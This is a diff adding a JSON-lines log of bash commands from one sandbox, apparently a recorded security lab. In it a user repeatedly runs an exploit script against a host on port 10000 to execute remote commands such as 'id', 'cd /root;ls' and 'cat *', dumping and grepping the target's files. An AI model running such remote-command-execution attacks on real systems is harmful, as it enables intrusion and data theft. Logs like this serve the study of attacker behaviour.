@@ -1,0 +1,28 @@
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:02:30.120840+02:00", "cmd_type": "bash-command", "cmd": "mv script script.py"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:06:59.215297+02:00", "cmd_type": "bash-command", "cmd": "script.py 172.18.1.5:10000 ls"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:07:13.880245+02:00", "cmd_type": "bash-command", "cmd": "python script.py 172.18.1.5:10000 ls"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:09:13.500177+02:00", "cmd_type": "bash-command", "cmd": "python script.py 172.18.1.5:10000/session_login.cgi ls"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:09:35.697018+02:00", "cmd_type": "bash-command", "cmd": "python script.py 172.18.1.5:10000 ls"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:12:35.830663+02:00", "cmd_type": "bash-command", "cmd": "python script.py 172.18.1.5:10000 id"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:12:53.574759+02:00", "cmd_type": "bash-command", "cmd": "python3 script.py 172.18.1.5:10000 ls"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:13:02.240796+02:00", "cmd_type": "bash-command", "cmd": "python script.py 172.18.1.5:10000 ls"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:13:46.419587+02:00", "cmd_type": "bash-command", "cmd": "python script.py https://172.18.1.5:10000 ls"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:13:58.702347+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 ls"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:15:35.522679+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 cd /root;ls"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:16:27.634051+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 \"cd /root;ls\""}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:17:20.442639+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 \"cat *\""}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:18:30.225415+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 \"ls\""}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:18:50.753706+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 \"cat twofactor.pl\""}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:19:23.435752+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 \"ls\""}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:20:46.220029+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 \"cat CHANGELOG\""}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:21:09.066930+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 \"ls\""}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:21:48.904446+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 \"twofactor_form.cgi\""}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:21:58.267448+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 \"cat twofactor_form.cgi\""}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:22:39.060766+02:00", "cmd_type": "bash-command", "cmd": "python script.py http://172.18.1.5:10000 \"cat *\" > out.txt"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:26:12.040769+02:00", "cmd_type": "bash-command", "cmd": "grep \"\\d{5}\" out.txt"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:29:16.827299+02:00", "cmd_type": "bash-command", "cmd": "mv myscript.py"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:29:26.394161+02:00", "cmd_type": "bash-command", "cmd": "mv myscript myscript.py"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:35:19.914772+02:00", "cmd_type": "bash-command", "cmd": "python3 myscript.py"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:36:01.954768+02:00", "cmd_type": "bash-command", "cmd": "python3 myscript.py"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:36:34.386631+02:00", "cmd_type": "bash-command", "cmd": "python3 myscript.py"}
+{"sandbox_id": "128", "timestamp_str": "2020-05-06T17:37:03.137332+02:00", "cmd_type": "bash-command", "cmd": "python3 myscript.py"}
